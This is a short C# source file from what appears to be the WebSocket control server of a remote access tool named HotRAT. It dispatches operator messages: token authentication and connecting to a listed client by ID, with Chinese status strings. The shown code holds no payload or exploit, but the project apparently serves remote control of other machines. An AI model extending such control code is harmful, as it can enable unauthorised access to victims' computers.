using HotRAT.Server;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace HotRAT.WSServer.Models
{
    internal class WSHandles
    {
        public static async Task HandleMessage(NetworkStream stream, string cid, string msg)
        {
            var flags = msg.Split("\n");
            switch (flags[0].ToUpper())
            {
                case "AUTH":
                    if (flags.Length == 2 && flags[1] == Runtimes.Token())
                    {
                        WebSocketServer.UpdataAllClients();
                    }
                    break;

                case "CONNECT":
                    if (flags.Length == 2)
                    {
                        foreach (var connects in Runtimes._clients)
                        {
                            if (connects.Key.ToString() == flags[1])
                            {
                                Runtimes.CWrite($"连接到{flags[1]}",ConsoleColor.Green,true);
                                await WebSocketServer.SendMessageAsync(stream, $"已连接到{flags[1]}");
                            }
                        }
                    }
                    break;

                default:
                    break;
            }

        }
    }
}
